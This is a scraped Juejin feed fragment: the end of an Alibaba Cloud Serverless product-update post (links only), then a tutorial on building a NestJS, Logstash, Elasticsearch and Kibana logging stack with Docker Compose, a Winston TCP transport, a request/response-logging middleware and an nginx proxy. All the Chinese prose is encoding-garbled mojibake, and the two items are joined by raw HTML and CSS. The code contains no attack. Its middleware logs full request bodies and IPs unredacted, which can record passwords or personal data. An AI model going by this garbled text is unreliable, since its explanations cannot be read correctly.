itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é˜¿é‡Œäº‘ Serverless è®¡ç®— 11 æœˆäº§å“åŠ¨æ€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808363977648493/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿é‡Œäº‘äº‘åŸç”Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T10:26:02.000Z" title="Mon Dec 15 2025 10:26:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>ç²¾é€‰æ–‡ç« ï¼š</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzI4NzI5MDM1MQ%3D%3D%26mid%3D2247540709%26idx%3D1%26sn%3Da2a6aa8a66d88345ee06bf14db1cc184%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzI4NzI5MDM1MQ==&amp;mid=2247540709&amp;idx=1&amp;sn=a2a6aa8a66d88345ee06bf14db1cc184&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">ç®—åŠ›æˆæœ¬é™ä½ 33%ï¼Œä¸å…‰åŒå°˜ç”¨ Serverless AI èµ‹èƒ½å½±è§†å•†ä¸šå†…å®¹ç”Ÿäº§</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzI4NzI5MDM1MQ%3D%3D%26mid%3D2247540713%26idx%3D1%26sn%3D3ea8c8b3b1902f33d3aaa335db1746d8%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzI4NzI5MDM1MQ==&amp;mid=2247540713&amp;idx=1&amp;sn=3ea8c8b3b1902f33d3aaa335db1746d8&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">ModelScope æ¨¡å‹ä¸€é”®ä¸Šçº¿ï¼ŸFunModel å¸®ä½  5 åˆ†é’Ÿä»é›¶åˆ°ç”Ÿäº§</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzI4NzI5MDM1MQ%3D%3D%26mid%3D2247540726%26idx%3D1%26sn%3D2b25a7e918f073f13826e7e1f033e859%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzI4NzI5MDM1MQ==&amp;mid=2247540726&amp;idx=1&amp;sn=2b25a7e918f073f13826e7e1f033e859&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">åŠ©åŠ›ä¼ä¸šæ„å»º AI åŸç”Ÿåº”ç”¨ï¼Œå‡½æ•°è®¡ç®— FunctionAI é‡å¡‘æ¨¡å‹æœåŠ¡ä¸ Agent å…¨æ ˆç”Ÿæ€</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzI4NzI5MDM1MQ%3D%3D%26mid%3D2247540731%26idx%3D1%26sn%3Dcff5735d1618973c9796560e9fd5957e%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzI4NzI5MDM1MQ==&amp;mid=2247540731&amp;idx=1&amp;sn=cff5735d1618973c9796560e9fd5957e&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">ã€æœ¬ä¸è¯¥æ•…éšœç³»åˆ—ã€‘ä» runC åˆ° runDï¼šSAE å¦‚ä½•åŒ–è§£å®‰å…¨æ³„éœ²é£é™©</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzI4NzI5MDM1MQ%3D%3D%26mid%3D2247540736%26idx%3D1%26sn%3D33dc40efdba498ef21be76941c880138%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzI4NzI5MDM1MQ==&amp;mid=2247540736&amp;idx=1&amp;sn=33dc40efdba498ef21be76941c880138&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">ä»ä»£ç åˆ°ç”Ÿäº§æ¨ç†æœåŠ¡ï¼šDevPod å…¨æµç¨‹éƒ¨ç½² DeepSeek-OCR æ¨¡å‹å®æˆ˜æŒ‡å—</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzI4NzI5MDM1MQ%3D%3D%26mid%3D2247540741%26idx%3D1%26sn%3D3181c44891771b03ecc677dce5a05216%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzI4NzI5MDM1MQ==&amp;mid=2247540741&amp;idx=1&amp;sn=3181c44891771b03ecc677dce5a05216&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">ã€æœ¬ä¸è¯¥æ•…éšœç³»åˆ—ã€‘å‘Šåˆ«èµ„æºâ€œä¸ç¡®å®šæ€§â€ï¼ŒSAE å¦‚ä½•ç ´è§£åˆšæ€§äº¤ä»˜æ ¸å¿ƒå›°å¢ƒ</a></p>
<h2 data-id="heading-0">äº§å“æœ€æ–°æ¶ˆæ¯</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4577c99b448248768dbd002936373ba4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766399162&amp;x-signature=QWbWUsCV7T0lOyjNC%2BKA3H2tofU%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Docker+NestJS+ELKï¼šä»é›¶æ­å»ºå…¨é“¾è·¯æ—¥å¿—ç›‘æ§ç³»ç»Ÿ]]></title>    <link>https://juejin.cn/post/7583898823920746538</link>    <guid>https://juejin.cn/post/7583898823920746538</guid>    <pubDate>2025-12-15T10:21:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583898823920746538" data-draft-id="7583727768544100388" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Docker+NestJS+ELKï¼šä»é›¶æ­å»ºå…¨é“¾è·¯æ—¥å¿—ç›‘æ§ç³»ç»Ÿ"/> <meta itemprop="keywords" content="åç«¯,NestJS"/> <meta itemprop="datePublished" content="2025-12-15T10:21:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ovensi"/> <meta itemprop="url" content="https://juejin.cn/user/3175045312291598"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Docker+NestJS+ELKï¼šä»é›¶æ­å»ºå…¨é“¾è·¯æ—¥å¿—ç›‘æ§ç³»ç»Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3175045312291598/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ovensi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T10:21:53.000Z" title="Mon Dec 15 2025 10:21:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>éšç€ NestJS é¡¹ç›®å®¹å™¨åŒ–éƒ¨ç½²çš„è½åœ°ï¼Œä¼ ç»Ÿçš„ <code>docker logs</code> æŸ¥çœ‹æ—¥å¿—æ–¹å¼å·²æ— æ³•æ»¡è¶³æ’æŸ¥éœ€æ±‚ã€‚ä»Šå¤©èŠ±æ—¶é—´æ­å»ºäº†ä¸€å¥—åŸºäº Elastic Stack (ELK) çš„å…¨é“¾è·¯æ—¥å¿—ç›‘æ§ç³»ç»Ÿï¼Œå®ç°äº†æ—¥å¿—çš„è‡ªåŠ¨é‡‡é›†ã€ç»“æ„åŒ–å­˜å‚¨å’Œå¯è§†åŒ–åˆ†æã€‚</p>

<h2 data-id="heading-0">1. æ•´ä½“æ¶æ„</h2>
<p>ä½¿ç”¨ Docker Compose ç¼–æ’æ•´ä¸ªæœåŠ¡æ ˆï¼ŒåŒ…å«ä»¥ä¸‹ç»„ä»¶ï¼š</p>
<ul>
<li><strong>NestJS App</strong>: ä¸šåŠ¡æœåŠ¡ï¼Œé€šè¿‡ TCP ç›´æ¥å‘é€æ—¥å¿—ã€‚</li>
<li><strong>Logstash</strong>: æ¥æ”¶ TCP æ—¥å¿—æµï¼Œå¤„ç†åå­˜å…¥ ESã€‚</li>
<li><strong>Elasticsearch</strong>: å­˜å‚¨å’Œç´¢å¼•æ—¥å¿—æ•°æ®ã€‚</li>
<li><strong>Kibana</strong>: å¯è§†åŒ–é¢æ¿ï¼Œé…ç½®äº†ä¸­æ–‡ç•Œé¢å’Œå­è·¯å¾„è®¿é—®ã€‚</li>
<li><strong>Fleet Server</strong>: ç”¨äºç®¡ç† Elastic Agentï¼ˆé¢„ç•™å®‰å…¨ç›‘æ§èƒ½åŠ›ï¼‰ã€‚</li>
</ul>
<h2 data-id="heading-1">2. æ ¸å¿ƒé…ç½®è¦ç‚¹</h2>
<h3 data-id="heading-2">2.1 Docker Compose ç¼–æ’</h3>
<p>ä¸ºäº†åœ¨ä½é…æœåŠ¡å™¨ä¸Šæµç•…è¿è¡Œï¼Œå¯¹ ES å’Œ Logstash è¿›è¡Œäº†ä¸¥æ ¼çš„å†…å­˜é™åˆ¶ã€‚</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># docker-compose.prod.yml</span>
<span class="hljs-attr">services:</span>
  <span class="hljs-attr">elasticsearch:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">elasticsearch:7.17.18</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"ES_JAVA_OPTS=-Xms512m -Xmx512m"</span> <span class="hljs-comment"># é™åˆ¶å†…å­˜</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">xpack.security.enabled=true</span>      <span class="hljs-comment"># å¼€å¯å®‰å…¨è®¤è¯</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">elasticsearch_data:/usr/share/elasticsearch/data</span>

  <span class="hljs-attr">kibana:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">kibana:7.17.18</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">SERVER_BASEPATH=/log</span>            <span class="hljs-comment"># é…ç½®å­è·¯å¾„è®¿é—®</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">SERVER_REWRITEBASEPATH=true</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">I18N_LOCALE=zh-CN</span>               <span class="hljs-comment"># å¼€å¯ä¸­æ–‡ç•Œé¢</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"5601:5601"</span>

  <span class="hljs-attr">logstash:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">logstash:7.17.18</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"5000:5000"</span>                     <span class="hljs-comment"># æš´éœ² TCP ç«¯å£æ¥æ”¶æ—¥å¿—</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./elk/logstash/pipeline/logstash.conf:/usr/share/logstash/pipeline/logstash.conf</span>
</code></pre>
<h3 data-id="heading-3">2.2 NestJS è‡ªå®šä¹‰ Logstash Transport</h3>
<p>ä¸ºäº†ä¸ä¾èµ–æ–‡ä»¶æŒ‚è½½ï¼Œç›´æ¥åœ¨ NestJS ä¸­é€šè¿‡ TCP å‘é€æ—¥å¿—ã€‚æˆ‘ä»¬éœ€è¦è‡ªå®šä¹‰ä¸€ä¸ª Winston Transportã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/common/logger/logstash.transport.ts</span>
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> winston <span class="hljs-keyword">from</span> <span class="hljs-string">'winston'</span>;
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> net <span class="hljs-keyword">from</span> <span class="hljs-string">'net'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogstashTransport</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">winston.transport</span> {
  <span class="hljs-comment">// ...çœç•¥è¿æ¥é‡è¿é€»è¾‘</span>
  <span class="hljs-title function_">log</span>(<span class="hljs-params">info: <span class="hljs-built_in">any</span>, callback: () =&gt; <span class="hljs-built_in">void</span></span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">client</span>) {
      <span class="hljs-keyword">const</span> logEntry = {
        <span class="hljs-string">'@timestamp'</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>(),
        <span class="hljs-attr">app</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">appName</span>,
        ...info <span class="hljs-comment">// åŒ…å« message, level, req, res ç­‰æ‰€æœ‰å…ƒæ•°æ®</span>
      };
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">client</span>.<span class="hljs-title function_">write</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(logEntry) + <span class="hljs-string">'\n'</span>);
    }
    <span class="hljs-title function_">callback</span>();
  }
}
</code></pre>
<h3 data-id="heading-4">2.3 å…¨é‡è¯·æ±‚ä¸Šä¸‹æ–‡æ•è·</h3>
<p>è¿™æ˜¯ä»Šå¤©çš„é‡å¤´æˆã€‚é»˜è®¤çš„æ—¥å¿—å¾€å¾€ç¼ºå°‘å…¥å‚å’Œå‡ºå‚ï¼Œæ’æŸ¥é—®é¢˜éå¸¸ç—›è‹¦ã€‚é€šè¿‡è‡ªå®šä¹‰ä¸­é—´ä»¶ï¼Œæ‹¦æˆª <code>res.send</code> æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥æ•è·å®Œæ•´çš„è¯·æ±‚ä½“å’Œå“åº”ä½“ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/common/middleware/logging.middleware.ts</span>
<span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoggingMiddleware</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">NestMiddleware</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-meta">@Inject</span>(WINSTON_MODULE_PROVIDER) <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> logger: Logger</span>) {}

  <span class="hljs-title function_">use</span>(<span class="hljs-params">req: Request, res: Response, next: NextFunction</span>) {
    <span class="hljs-keyword">const</span> start = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
    
    <span class="hljs-comment">// åŠ«æŒ res.send ä»¥è·å–å“åº”ä½“</span>
    <span class="hljs-keyword">const</span> originalSend = res.<span class="hljs-property">send</span>;
    <span class="hljs-keyword">let</span> <span class="hljs-attr">responseBody</span>: <span class="hljs-built_in">any</span>;
    res.<span class="hljs-property">send</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">body</span>) {
      responseBody = body;
      <span class="hljs-keyword">return</span> originalSend.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-variable language_">arguments</span>);
    };

    res.<span class="hljs-title function_">on</span>(<span class="hljs-string">'finish'</span>, <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-comment">// ç»„è£…ç»“æ„åŒ–æ—¥å¿—</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">logger</span>.<span class="hljs-title function_">info</span>(
        <span class="hljs-string">`<span class="hljs-subst">${req.method}</span> <span class="hljs-subst">${req.originalUrl}</span> <span class="hljs-subst">${res.statusCode}</span>`</span>, 
        {
          <span class="hljs-attr">req</span>: { <span class="hljs-attr">body</span>: req.<span class="hljs-property">body</span>, <span class="hljs-attr">query</span>: req.<span class="hljs-property">query</span>, <span class="hljs-attr">ip</span>: req.<span class="hljs-property">ip</span> },
          <span class="hljs-attr">res</span>: { <span class="hljs-attr">statusCode</span>: res.<span class="hljs-property">statusCode</span>, <span class="hljs-attr">body</span>: <span class="hljs-title function_">tryParseJSON</span>(responseBody) },
          <span class="hljs-attr">context</span>: <span class="hljs-string">'HTTP'</span>,
        }
      );
    });

    <span class="hljs-title function_">next</span>();
  }
}
</code></pre>
<h2 data-id="heading-5">3. éƒ¨ç½²ä¸è¿ç»´</h2>
<p>ç¼–å†™äº† <code>deploy.sh</code> è„šæœ¬ï¼Œå®ç°æœ¬åœ°ä»£ç ä¸€é”®æ¨é€è‡³æœåŠ¡å™¨å¹¶é‡å»ºå®¹å™¨ã€‚</p>
<p>è§£å†³çš„ä¸€ä¸ªå…³é”®å‘æ˜¯ <strong>Kibana çš„å­è·¯å¾„ä»£ç†</strong>ã€‚åœ¨ Nginx ä¸­é…ç½®ï¼š</p>
<pre><code class="hljs language-nginx" lang="nginx">location /log/ {
    proxy_pass http://localhost:5601/;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    # å…³é”®ï¼šKibana éœ€è¦çŸ¥é“å®ƒè¿è¡Œåœ¨ä»£ç†åé¢
}
</code></pre>
<p>åŒæ—¶åœ¨ Kibana ç¯å¢ƒå˜é‡ä¸­å¿…é¡»é…åˆ <code>SERVER_BASEPATH=/log</code> å’Œ <code>SERVER_REWRITEBASEPATH=true</code>ã€‚</p>
<h2 data-id="heading-6">4. æœ€ç»ˆæ•ˆæœ</h2>
